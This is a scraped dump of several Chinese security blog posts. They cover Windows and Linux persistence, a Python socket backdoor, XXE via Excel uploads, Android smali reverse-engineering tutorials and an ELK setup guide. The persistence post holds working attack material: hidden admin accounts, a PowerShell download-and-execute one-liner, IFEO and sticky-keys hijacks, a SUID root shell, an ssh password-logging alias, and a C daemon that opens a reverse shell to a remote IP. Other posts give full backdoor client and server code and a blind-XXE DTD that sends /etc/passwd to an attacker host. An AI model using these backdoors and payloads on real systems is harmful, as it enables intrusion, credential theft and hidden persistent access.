4.删除计划任务： crontab -r -u 用户名 - 相关文件 /var/spool/cron/用户名 #用户定义的设置 /var/log/cron #cron服务的日志文件 /etc/crontab #cron服务配置文件： anacron anacron是一个不同于crontab的任务，其只精确到天，用来弥补服务器在宕机下crond调度不周以及缓解计划任务执行过于集中的问题。它需要记录上次执行的时间，并更新到相应的/var/spool/anacron目录下，下次执行的时候会将当前时间和上次记录的时间进行对比，如果满足大于/etc/anacron的配置的天数就会立即执行相应的命令，然后刷新时间。 anacron 命令行参数： -t 配置文件路径 让anacron从指定配置文件中读取配置，常用于普通用户来管理个人任务 -S spooldir 设定新的spool目录来记录任务执行的时间戳，常用于普通用户来管理个人任务 -T 测试配置文件是否正确 -f 强制执行所有的任务，而不管之前的执行日期是否超过轮回天数 -u 将所有任务的执行日期都更新为当前日期，而不真正的执行任务 -s 串行地执行任务，只有前一个任务完成后才开始下一个任务 0x03 windows权限维持影子账户创建一个无法用用户本机用户罗列工具显示的用户，并且赋予管理员权限。所有操作需要有管理员权限。同时测试在windows server 2012服务器域环境下影子账户无法直接进行添加。 用’$’创建匿名用户，并归到administratorsa用户组 net user admin$ Test1 /add net localgroup administrators admin$ /add 导出匿名用户对应的sam目录下的注册表键值 regedt32.exe 打开 HKEY_LOCAL_MACHINESAMSAMDomainsAccountUsers键值，导出Names下用户目录以及对应的16进制目录。注意需要给Administrator用户赋予Sam键值权限，默认是不允许的。 删除匿名用户，双击导出的注册表文件，用先前导出的注册表键值对注册表进行修改。则可以重新还原之前的匿名用户，但是除了在注册表里面有用户记录，其他地方都不存在用户的信息。net user或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。 net user admin$ /del PowerShell后门Empire框架 https://github.com/EmpireProject/Empire Schtasks-Backdoor https://github.com/re4lity/Schtasks-Backdoor msf use exploit/multi/script/web_delivery - 设置好参数后的powershell例子： powershell.exe -ExecutionPolicy Bypass -nop -w hidden -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $V.downloadstring(&#39;http://192.168.80.155:8888/&#39;); 注册表开机启动在如下的注册表目录下注入键值HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun，可以实现开机自启动。以windows defender为例: 映像劫持 细节参考：https://www.anquanke.com/post/id/151425 涉及到的注册表项为IFEO（Image File Execution Options），默认是只有管理员和local system有权读写修改。 “HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Options” 大致的原理如下：当我们按照常理运行属于IFEO列表的文件的时候（即可执行文件名在上述的注册表项下，出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就可以正常运行。）会执行相关的选项参数，这里我们主要利用的参数是debugger,通过该参数我们可以实现偷梁换柱。下面以修改IE启动程序为例，实现运行IE程序但是启动的却是计算器。 1. 找到注册表“HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Options”目录下的iexplore.exe 2. 添加一个debugger字符串键值，并且赋值为calc.exe的执行路径，“C:Windowssystem32calc.exe” 3. 运行 iexplore.exe,bomb!!! 当然我们也可以在第一步新键一个注册表文件目录，取名为想要覆盖的可执行程序，后续步骤类似。 但是这样明目张胆的偷梁换柱有点张扬，根据安全客那篇文章，修改另外两个注册表键值可以实现原程序退出后静默运行后门程序。以执行notepad为例，退出后静默运行calc.exe reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionsnotepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512 reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitnotepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1 reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitnotepad.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;C:Windowssystem32calc.exe&quot; shift后门这个后门的方式比较老，在windows登陆的时候按五次shift打开cmd进行操作。前提条件是:在将C盘windows目录下面的system32文件夹可写的情况下，将里面的sethc.exe应用程序进行转移，并生成sethc.exe.bak文件。并将cmd.exe拷贝覆盖sethc.exe。 但是在windows xp过后，sethc组件属于完全受信用的用户TrustInstall，我们无法修改名字，这时候即使administrators都只有名义上的只读和可执行权，我们可以手动修改其所属为administrators，步骤如下： 右键属性/安全/高级； 所有者/编辑/添加当前用户/应用/确定； 关闭窗口； 右键属性/安全/编辑； 选择Administrators（或者你的当前组）/勾选完全控制/确定； 0x04 linux权限维持可以看到windows的权限维持很多时候是基于注册表值，但是linux里面没有注册表项，但是有很多的配置文件选项，可以达到相似的功能。下面介绍一些比较实用的后门手段。 sshd软连接 原理细节： http://www.91ri.org/16803.html victim ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555; attack ssh root@x.x.x.x -p 5555 SUID Shellroot 权限下执行如下命令，普通用户运行/dev/.rootshell即可获得root权限 cp /bin/bash /dev/.rootshell chmod u+s /dev/.rootshell alias瞒天过海我们可以通过alias来指定执行特定的命令时候静默运行其他程序，从而达到启动后门，记录键值等作用。下面举两个实例： 修改ssh命令，利用strace，使其具有记录ssh对read,write,connect调用的功能。 alias ssh=&#39;strace -o /tmp/sshpwd-`date &#39;+%d%h%m%s&#39;`.log -e read,write,connect -s2048 ssh&#39; 利用守护进程回弹shell alias cat=&#39;cat&amp;&amp;/root/.shell&#39; shell.c #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;time.h&gt; #include &lt;fcntl.h&gt; #include &lt;string.h&gt; #include &lt;sys/stat.h&gt; #include &lt;signal.h&gt; #define ERR_EXIT(m) do { perror(m); exit(EXIT_FAILURE); } while (0); void creat_daemon(void); int main(void) { time_t t; int fd; creat_daemon(); system(&quot;bash -i &gt;&amp; /dev/tcp/192.168.80.167/8080 0&gt;&amp;1&quot;); return 0; } void creat_daemon(void) { pid_t pid; int devnullfd,fd,fdtablesize; umask(0); pid = fork(); if( pid == -1) ERR_EXIT(&quot;fork error&quot;); if(pid &gt; 0 ) exit(EXIT_SUCCESS); if(setsid() == -1) ERR_EXIT(&quot;SETSID ERROR&quot;); chdir(&quot;/&quot;); /* close any open file descriptors */ for(fd = 0, fdtablesize = getdtablesize(); fd &lt; fdtablesize; fd++) close(fd); devnullfd = open(&quot;/dev/null&quot;, 0); /* make STDIN ,STDOUT and STDERR point to /dev/null */ if (devnullfd == -1) { ERR_EXIT(&quot;can&#39;t open /dev/null&quot;); } if (dup2(devnullfd, STDIN_FILENO) == -1) { ERR_EXIT(&quot;can&#39;t dup2 /dev/null to STDIN_FILENO&quot;); } if (dup2(devnullfd, STDOUT_FILENO) == -1) { ERR_EXIT(&quot;can&#39;t dup2 /dev/null to STDOUT_FILENO&quot;); } if (dup2(devnullfd, STDERR_FILENO) == -1) { ERR_EXIT(&quot;can&#39;t dup2 /dev/null to STDOUT_FILENO&quot;); } signal(SIGCHLD,SIG_IGN); return; } linux PAM密码记录后门pam是一种认证机制，它可帮助管理员快速方便地配置认证方式，并且无需更改服务程序。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。 https://blog.51cto.com/redkey/1343316 PROMPT_COMMAND后门bash提供了一个环境变量PROMPT_COMMAND,这个变量会在你执行命令前执行一遍。 export PROMPT_COMMAND=&quot;lsof -i:1025 &amp;&gt;/dev/null || (python -c &quot;exec(&#39;encoded_payload&#39;.decode(&#39;base64&#39;))&quot; 2&gt;/dev/null &amp;)&quot; 当然也可以使用prompt_command进行提权,参考：https://www.anquanke.com/post/id/155943 ssh免密后门把id_rsa.pub写入服务端的/home/[用户名]/.ssh/authorized_keys中。 rootkitrootit的后门相对比较顽固，有应用级别和系统级别的rootkit，其大致的思路是hook进常规的调用中，是比较硬核的，经常体现在APT攻击中。下面是一个菊苣收集的rootkit后门的链接。具体的细节因为不同的rootkit具体实现不一致，笔者才疏，无法完全弄清楚，仅给出链接，方便日后学习。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"Android 代码插桩","slug":"Android-代码插桩","date":"2019-02-14T09:51:20.000Z","updated":"2019-07-26T09:56:26.186Z","comments":true,"path":"2019/02/Android-代码插桩/","link":"","permalink":"/2019/02/Android-代码插桩/","excerpt":"","text":"何为代码插桩​ 最早是由J.C. Huang 教授提出的，它是在保证被测程序原有逻辑完整性的基础上在程序中插入一些探针（又称为“探测仪”，本质上就是进行信息采集的代码段，可以是赋值语或采集覆盖信息的函数调用，通过探针的执行并抛出程序运行的特征数据，通过对这些数据的分析，可以获得程序的控制流和数据流信息，进而得到逻辑覆盖等动态信息，从而实现测试目的的方法。 ​ 何为安卓插桩测试，插桩测试提供了一种通过 am instrument 命令启动的特殊测试执行环境，其中目标应用进程会重启并使用基本的应用上下文进行初始化，并在应用进程虚拟机内启动插桩线程。您的测试代码在此插桩线程上开始执行，并附带一个 Instrumentation 实例，该实例可提供对应用上下文和 API 的访问权限，以操纵接受测试的应用进程。 详细内容可以查看谷歌的插桩测试框架和方式：插桩测试 Log插桩此处，仅利用打印Log的方式来表示如何进行插桩。代码使用之前调试的代码，尝试来打印输入的字符串。 反编译后如下代码： 分析代码可以看到，如果需要打印输出，则实际获取到字符串的代码为 Name.getText().toString().trim() 因此，需要在onClick函数中打印输出，函数需要在按钮事件中触发，按钮相关的事件代码在MainActivity$1中。 在MainActivity$1中查看onClick函数。 假设，需要打印输入的name变量。则需要在如下添加： iget-object v1, p0, Lcom/example/user/application/MainActivity$1;-&gt;this$0:Lcom/example/user/application/MainActivity; iget-object v1, v1, Lcom/example/user/application/MainActivity;-&gt;Name:Landroid/widget/EditText; invoke-virtual {v1}, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable; move-result-object v1 invoke-virtual {v1}, Ljava/lang/Object;-&gt;toString()Ljava/lang/String; move-result-object v1 此内容为上图中关于带入name的smali代码，意思是，从MainActivity获取实例对象。赋值给v1寄存器，然后再调用getText()函数和toString()函数。 在添加 const-string v0, &quot;message&quot; invoke-static {v0, v1}, Landroid/util/Log;-&gt;i(Ljava/lang/String;Ljava/lang/String;)I 意思是调用Log.i函数打印输入，如上添加内容换算成Java代码类似于 Log.i(&quot;message&quot;,Name.getText().toString()); 回编译安装运行，监听日志输出，点击按钮事件可以看到如下的日志输出。 此种形式可以用在获取函数变量值和某些动态生成的参数中，来理解程序运行的结果和函数运行的方式。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"利用python socket编写后门","slug":"利用python-socket编写后门","date":"2019-02-02T03:00:50.000Z","updated":"2019-02-01T03:51:10.255Z","comments":true,"path":"2019/02/利用python-socket编写后门/","link":"","permalink":"/2019/02/利用python-socket编写后门/","excerpt":"","text":"在获取系统权限时候，一般想维持权限或者做端口转发的时候，会用一些端口转发的工具，例如nc，ew，lcx等。 但在这种类似后门的工具中被查杀率和存在后门的情况时有发生，本人就遇到过获取系统权限创建账号后，发现没多久又被植入其他隐藏账号的情况。 因此，既然会写一些代码就简单的来实现一个利用socket通信的后门脚本。 如下server端： # coding:utf-8 import socket import subprocess # server def server_main(ips): server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: server.bind((&quot;0.0.0.0&quot;, ips)) server.listen(5) print &quot;[*] Listening on %s:%d&quot; %(socket.gethostname(),ips) while True: data, addr = server.accept() buf = data.recv(4096) print &quot;[*] recv command = %s&quot; %buf if len(buf) != 0: if is_file(buf): rev = upload(buf) else: rev = run_command(buf) data.send(rev) except: print &quot;Exception!&quot; def is_file(buf): try: if isinstance(eval(buf), dict): return True except: return False def run_command(command): command = command.strip() try: p = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) out, err = p.communicate() except: out = &quot;Fail to execute command!&quot; return out def upload(data): try: path = eval(data)[&#39;path&#39;] file = eval(data)[&#39;request&#39;] with open(path, &#39;wb&#39;) as f: f.write(file) return &quot;OK&quot; except: return &quot;Fail&quot; if __name__ == &quot;__main__&quot;: ip = input(&quot;PORT = &quot;) server_main(int(ip)) client端： #coding:utf-8 import socket # client # use: # &gt;&gt; command eg:&gt;&gt; whoami # &gt;&gt; upload 要上传的源文件 要上传到的目标地址文件 &gt;&gt; upload d:/a.txt e:/a.txt def client(ips, data): resp = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: resp.settimeout(10) resp.connect(ips) resp.send(data) out = resp.recv(4096) resp.close() except : out = &quot;Except Or Time out !&quot; return out def client_send(target, port): while True: data = raw_input(&quot;&gt;&gt; &quot;) if &#39;upload&#39; not in data: out = client((target,port),data) print &quot;[*] Command Out= %s&quot; % out else: upload((target,port),data) def upload(ips,data): file = data.split(&#39; &#39;) list_a = {} name = file[1].replace(&#39;\\\\&#39;,&#39;/&#39;) list_a[&#39;path&#39;] = file[2] request = &#39;&#39; with open(name,&#39;rb&#39;) as f: for i in f.readlines(): request+=i list_a[&#39;request&#39;] = request out = client(ips, str(list_a)) if &quot;OK&quot; in out: print &quot;[*] File Write Success !&quot; else: print &quot;[*] File Write Fail !&quot; if __name__ == &quot;__main__&quot;: ip = raw_input(&quot;IP:PORT = &quot;) list_a = ip.split(&quot;:&quot;) client_send(list_a[0], int(list_a[1])) 代码实现简单，问题在执行的时候是一个正向连接，在服务器开放端口，所以在一定情况下，需要较高的权限。当然这也是后渗透中需要得到的目标。 同时可以利用pyinstaller打包为exe文件在win下运行，不过开放防火墙就需要添加网络允许，但本人尝试中发现，对防火墙端口添加的提示中直接关闭窗口提示，再次运行就可以正常使用。防火墙中也没有启用此运行规则。尚不清楚原因。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"利用EXCEL文件进行XXE文件攻击","slug":"利用EXCEL文件进行XXE文件攻击","date":"2019-01-31T03:38:27.000Z","updated":"2019-01-31T03:40:41.082Z","comments":true,"path":"2019/01/利用EXCEL文件进行XXE文件攻击/","link":"","permalink":"/2019/01/利用EXCEL文件进行XXE文件攻击/","excerpt":"","text":"利用EXCEL文件进行XXE文件攻击此问题的来源是：https://mp.weixin.qq.com/s/pthuQFY9sQjxJOOQf91Weg 看到一篇如上的文章，利用EXCEL文档来造成系统的XXE漏洞，而恰好在我们自己的系统上发现了如上的类似漏洞，特此做一个记录文档。 0x01.什么是XML外部实体解释来源：https://www.freebuf.com/articles/web/126788.html 如果你了解XML，你可以把XML理解为一个用来定义数据的东东。因此，两个采用不同技术的系统可以通过XML进行通信和交换数据。 比如，下图就是一个用来描述一个职工的XML文档样本，其中的’name’,’salary’,’address’ 被称为XML的元素。 有些XML文档包含system标识符定义的“实体”，这些XML文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了XML ‘实体’。 在上面的代码中， XML外部实体 ‘entityex’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’entityex’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’entityex’实体的值将从其后的URI中读取。因此，XML实体被使用的次数越多，越有帮助。 0×02. 什么是XML外部实体攻击？有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）。比如，下面的代码将获取系统上folder/file的内容并呈献给用户。 0×03. 怎么甄别一个XML实体攻击漏洞？最直接的回答就是： 甄别那些接受XML作为输入内容的端点。 但是有时候，这些端点可能并不是那么明显(比如，一些仅使用JSON去访问服务的客户端)。在这种情况下，渗透测试人员就必须尝试不同的测试方式，比如修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。 如何利用EXCEL文档来造成XXE漏洞根据原文档介绍，是对excel文件进行解压缩，来替换其中的[Content-Types].xml或者xl/workbook.xml文件，来造成XXE漏洞。 但根据利用情况的不同，还有可以替换的文件: _rels/.rels 和 xl/worksheets/sheet1.xml等文件。 因此我们自己的系统在文件上传处，也存在一块，类似的XXE利用。 例如此处文件上传处，上传EXCEL文件。 在文件中的[Content-Types].xml中写入测试POC： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;http://xxx.com/&quot; &gt;]&gt; &lt;name&gt;&amp;GVI;&lt;/name&gt; 于是便可以在我们自己的VPS上监听到来自服务器的请求了。 由于是Blind XXE，所以我们利用在我们自己的VPS上存入如下文件： &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &#39;http://ATTACKESERVER.com/?%file;&#39;&gt;&quot;&gt; %all; 远程利用类似如下： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERSERVER.com/xxe_file.dtd&quot;&gt; 这时候便可以在监听上收到远程文件的读取。 当然这一块还可以尝试利用已有的脚本，来自动的开启web监听和ftp来传输文件。 https://github.com/joernchen/xxeserve 其他文章介绍： 1.XXE漏洞利用技巧：从XML到远程代码执行 2.利用OOB XXE盲攻击获取文件系统访问权限","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"Android Studio 动态调试","slug":"Android-Studio-动态调试","date":"2019-01-29T08:47:40.000Z","updated":"2019-07-26T09:56:30.634Z","comments":true,"path":"2019/01/Android-Studio-动态调试/","link":"","permalink":"/2019/01/Android-Studio-动态调试/","excerpt":"","text":"Android Studio 动态调试调试仍然使用我们喜闻乐见的Android Studio，不过使用的是AS3，AS在3.0版本后便不在使用DDMS，调试smali上有点不适应，不过我们仍然可以在配置SDK后，在命令行输入“monitor”来打开DDMS。 apk使用我们自己生成的一个简单的登陆判断界面来做测试。 使用网上的一段登陆代码如下 生成APK后，利用AK反编译为smali代码。 然后用AS打开反编译后的文件夹，当然在利用AS调试smali的时候，需要安装ideasmali插件，具体可以百度插件名即可下载。 调试的时候需要我们进行端口的转发，可以先用DDMS查看一下端口是否是8700（一般默认为8700），因为启动AS后会占有相应的端口，导致无法打开DDMS。 具体使用方式为：打开DDMS。在CMD命令行输入以下内容，其中package为包名。MainActivity是需要调试的activity名，具体看情况修改。 adb shell am start -D -n package/.MainActivity 可以看到手机端或者模拟器端已经以调试的方式启动我们相应的程序了。在DDMS中就可以看到一只红色的小蜘蛛了。后面有一个端口默认应该是8700。然后查看进程PID，假设为1980。 adb forward tcp:8700 jdwp:1980 进行端口转发到。转发的时候要先关闭DDMS，不然显示端口被占用。 在使用AS打开我们需要的文件后，如以下内容。 配置远程调试参数，修改端口为8700. 然后在需要的地方设置断点，此处在账户密码的判断处下断点。启动调试，然后就可以看到界面显示到我们断点前的地方了。在模拟器上输入账号密码后，就可以看到断点被执行。 可以看到下面两部分第一部分为为v0赋值为admin，调用String类的equals方法来判断v0参数和p1对象值是否相同，并把结果赋值给v0，一个布尔值。第二部分，判断v0是否为0，等于0跳转到:cond_0处。不等于0则继续，同样为v0赋值一个字符串为12345，调用方法判断是否相同，以下则和上面基本一致。 此时，需要做些什么修改，判断，以后参数变化，可以在下面的variables查看，上图中的参数就是在模拟器中输入的参数显示。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"Android逆向逻辑修改入门","slug":"Android逆向逻辑修改入门","date":"2019-01-28T08:28:34.000Z","updated":"2019-07-26T09:56:19.794Z","comments":true,"path":"2019/01/Android逆向逻辑修改入门/","link":"","permalink":"/2019/01/Android逆向逻辑修改入门/","excerpt":"","text":"Android 逻辑判断修改使用AS创建一个工程，利用生成工程的初始代码来做。 创建新的layout，在mainactivity中添加新的layout标识。在显示界面的时候加一个判断逻辑，完成后类似如下 if(a==1) { setContentView(R.layout.activity_main); } else setContentView(R.layout.activity_main2); } 于是乎，当a为1的时候显示activity_main界面字段。不为1显示activity_main2字段。 一般情况下，对于有些需要内购，或者某些情况才给你显示的界面的时候，界面不是从后端返回而是返回json参数由前端接收显示的时候，可以从前端修改逻辑来绕过判断。 生成smali代码，其中主要部分为下： .method protected onCreate(Landroid/os/Bundle;)V .registers 4 .param p1, &quot;savedInstanceState&quot; # Landroid/os/Bundle; .prologue .line 17 invoke-super {p0, p1}, Landroid/support/v7/app/AppCompatActivity;-&gt;onCreate(Landroid/os/Bundle;)V .line 18 const/4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const/4 v1, 0x1 if-ne v0, v1, :cond_e .line 20 const v1, 0x7f09001c invoke-virtual {p0, v1}, Lcom/example/user/application/MainActivity;-&gt;setContentView(I)V .line 24 :goto_d return-void .line 23 :cond_e const v1, 0x7f09001d invoke-virtual {p0, v1}, Lcom/example/user/application/MainActivity;-&gt;setContentView(I)V goto :goto_d .end method 整体的代码相当简单轻松，来看判断代码处。 .line 18 const/4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const/4 v1, 0x1 if-ne v0, v1, :cond_e 其中if-ne，逻辑显示v0不等于v1，跳转到cond_e标签处。 修改一：直接修改if-ne判断形式，修改为if-eq，这样只要不完成正常的逻辑操作，都会跳转到我们想看的界面。 修改二：由于判断处是根据参数a的值和1做对比，所以我们直接对a重赋值(以上的a赋值可以粗略的看为是请求获取的值)。 .line 18 const/4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const/4 v1, 0x1 const/4 v0, 0x1 if-ne v0, v1, :cond_e 修改三：利用强制跳转，在需要去查看，或者执行下去的地方添加标签，goto_1，然后在判断执行前强制跳转进去。 const/4 v1, 0x1 goto :goto_1 if-ne v0, v1, :cond_0 .line 20 :goto_1 const v1, 0x7f09001c","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"Android 逆向Smali语言初识","slug":"Android-逆向Smali语言初识","date":"2019-01-22T07:55:56.000Z","updated":"2019-07-26T09:56:22.802Z","comments":true,"path":"2019/01/Android-逆向Smali语言初识/","link":"","permalink":"/2019/01/Android-逆向Smali语言初识/","excerpt":"","text":"Android 逆向Smali语言初识​ Smali，Baksmali分别是指安卓系统里的Java虚拟机（Dalvik）所使用的一种.dex格式文件的汇编器，反汇编器。 函数语法​ Smali 语法规范与格式Smali 是对 Dalvik 虚拟机字节码的一种解释，虽然不是官方标准语言，但所有语句都遵循一套语法规范。要了解 smali 语法规范，可以先从了解 Dalvik 虚拟机字节码的指令格式开始。3.1 Dalvik 虚拟机字节码指令格式在 Android 4.0 源码 Dalvik/docs 目录下提供了一份文档 instruction-formats.html，里面详细列举了 Dalvik 虚拟机字节码指令的所有格式。 Dalvik 虚拟机字节码的类型、方法和字段的表示方法3.2.1 类型Dalvik 字节码有两种类型，基本类型和引用类型。对象和数组是引用类型，其它都是基本类型。 Dalvik 字节码类型描述符 ​ 描述符 类型 V void，只能用于返回值类型 Z boolean B byte S short C charI intJ long（64 位） F floatD double（64 位） L Java 类类型 [ 数组类型 常见的代码含义： #表示当前代码在源java文件中的行数。 .line .line 34 #表示来自公共方法methodAReturn返回值是一个对象com.bolex.AA method .method public methodAReturn(Lcom/bolex/AA;Lcom/bolex/AA;)Lcom/bolex/AA; #表示该函数上需要使用3个寄存器 registers .registers 3 #表示接收两个入参都是AA对象，并标记寄存器p1和p2 param .param p1, &quot;mAA&quot; # Lcom/bolex/AA; .param p2, &quot;sAA&quot; # Lcom/bolex/AA; #表示函数内执行的起始标记 .prologue .prologue #表示 返回寄存器上p1对象 return-object return-object p1 #表示函数结束标记 .end method #创建一个AA对象 new-instance new-instance v0, Lcom/bolex/AA; #表示使用无参构造方法直接调用 invoke-direct invoke-direct {v0}, Lcom/bolex/AA;-&gt;&lt;init&gt;()V #表示为虚拟方法 invoke-virtual #数组操作指令 #new-array构造指定类型I也就是int类型并且把值赋给v0 # v0=new int[8]; new-array v0,v0,[ I #array-length 获取给定v0寄存器中数组的长度并将值赋给v1寄存器，数组长度就是数组的个数。v1=v0,也就是说v1=8 array-length v1,v0 # 方法调用指令 #new-instance v1,... 构造一个指定类型对象的新实例，并将对象引用赋值给v1寄存器。 #L表示java类型中的任何类， # StringBuilder对象是动态对象，允许扩充它所封装的字符串中字符的数量，但是您可以为它可容纳的最大字符数指定一个值。相当于是一个string的升级版。 new-instance v1,Ljava/lang/StringBuilder; # 方法调用指令 #&lt;init&gt;:在实例创建出来的时候调用，包括调用new操作符； new-direct v1,Ljava/lang/StringBuilder;-&gt;&lt;init&gt;( )v # 跳转指令 if (v0!=0) #if-nez 的意思就是 not equal zero 如果v0不等于0，那么就继续向下执行，如果等于0就跳转到标号名为cond_0的位置。 if-nez v0, : cond_0 # goto的含义就是强行跳转到标号名为goto_0的地方 goto :goto_0 #标号cond_0 ：cond_0 # 数据转换指令 #把int型变量转变为float变量 int-to-float v2,v2 # 数据运算指令 # 相当于 v2+=v2，第一个v2是寄存器，第二个和第三个是数据 add-float v2,v2,v2 Java编译dex文件以下用常见的hello world来表示smali语法结构。 public class firedt { public static void main(String[] args){ System.out.println(&quot;hello world&quot;); } } 在AS中打开代码，安装java2smali插件后，在build-&gt;compile to smali编译为smali代码。 编译完成后的代码为以下，并对关键代码进行注释含义： .class public Lfiredt; #定义一个firedt类 .super Ljava/lang/Object; #继承object类 .source &quot;firedt.java&quot; #由firedt.java编译来 # direct methods .method public constructor &lt;init&gt;()V .registers 1 #注册一个寄存器 .prologue #代码开始 .line 1 #第一行 invoke-direct {p0}, Ljava/lang/Object;-&gt;&lt;init&gt;()V return-void .end method .method public static main([Ljava/lang/String;)V #说明一个main的静态方法，类型为void .registers 3 .prologue .line 3 sget-object v0, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream; #获取变量对象保存到v0 const-string v1, &quot;hello world&quot; #赋值一个字符串v1=hello world invoke-virtual {v0, v1}, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V #调用printstream的println方法把v0赋值v1 .line 4 return-void .end method #方法结束，一个method对应一个end method 参考资料： smali语法中文参考文档 逆向之Smali入门学习","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"ELK搭建使用","slug":"ELK搭建使用","date":"2018-11-04T09:05:12.000Z","updated":"2018-11-04T09:34:33.734Z","comments":true,"path":"2018/11/ELK搭建使用/","link":"","permalink":"/2018/11/ELK搭建使用/","excerpt":"","text":"ELK日志分析系统搭建使用ELK是三个开源软件的缩写，分别表示：Elasticsearch , Logstash, Kibana , 它们都是开源软件。但现在新增了一个FileBeat，它是一个轻量级的日志收集处理工具(Agent)，Filebeat占用资源少，适合于在各个服务器上搜集日志后传输给Logstash，但此次并不添加filebeat，仍然以es、logstash、kibana做搭建使用。 使用环境：centos6.5 192.168.253.138作为日志来源服务器 apache ​ centos7 192.168.253.139 作为显示终端服务器 安装jdk首先安装Java，版本1.8以上。 安装Elasticsearch下载elasticsearch ， wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.4.2.tar.gz 修改解压文件中的config/elasticsearch.yml 文件 # 这里指定的是集群名称，需要修改为对应的，开启了自发现功能后，ES会按照此集群名称进行集群发现 cluster.name: es_cluster node.name: es_cluster_1 # 数据目录 path.data: /data/data # log 目录 path.logs: /data/logs # 修改一下ES的监听地址，这样别的机器也可以访问 network.host: 192.168.253.139 # 默认的端口号 http.port: 9200 discovery.zen.ping.unicast.hosts: [&quot;192.168.253.138&quot;, &quot;192.168.253.139&quot;] 在使用中可能会因为系统内存等问题导致启动失败，所以可以预调整系统参数。 设置内核参数 vi /etc/sysctl.conf # 增加以下参数 vm.max_map_count=655360 执行以下命令，确保生效配置生效： sysctl -p 设置资源参数 vi /etc/security/limits.conf # 修改 * soft nofile 65536 * hard nofile 131072 * soft nproc 65536 * hard nproc 131072 设置用户资源参数 vi /etc/security/limits.d/20-nproc.conf # 设置elk用户参数 elk soft nproc 65536 启动elk需要非root用户，所以创建elk用户。 useradd elk #创建用户elk groupadd elk #创建组elk useradd elk -g elk #将用户添加到组 mkdir -pv /data/{data,logs} # 创建数据和日志目录 # 修改文件所有者 chown -R elk:elk /data/ chown -R elk:elk /etc/elasticsearch/ 切换到elk用户，启动服务 启动文件 /etc/elasticsearch/bin/elasticsearch 服务器要关闭防火墙 systemctl stop firewalld.service 这时候可以看到log输出，节点正常启动. 用浏览器访问，同时可以正常使用 安装Logstash下载解压 wget https://artifacts.elastic.co/downloads/logstash/logstash-6.4.2.tar.gz 在解压后目录执行 /usr/share/logstash/bin/logstash -e &#39;input { stdin { } } output { stdout {} }&#39; 在命令行输入什么内容讲原样输出，比如： 显示正常以后再去修改配置文件，需要自己添加，创建如下内容文件。 cat logstash-simple.conf input{ file { path =&gt; &quot;/var/log/httpd/*&quot; start_position =&gt; beginning } } output { stdout { codec=&gt; rubydebug } elasticsearch { hosts =&gt; &quot;192.168.253.132:9200&quot; protocol =&gt; &quot;http&quot; index =&gt; &quot;logstash-%{+YYYY-MM}&quot; } } 开启服务，执行如下命令： /usr/share/logstash/bin/logstash -f /usr/share/logstash/config/logstash-simple.conf 我们可以查看 ES 是否接收到了数据： Kibana的安装wget https://artifacts.elastic.co/downloads/kibana/kibana-6.4.2-linux-x86_64.tar.gz 编辑kibana.yml配置文件 vi /usr/share/kibana/config/kibana.yml 修改以下参数： server.port: 5601 #开启默认端口5601，本文修改默认端口为5602 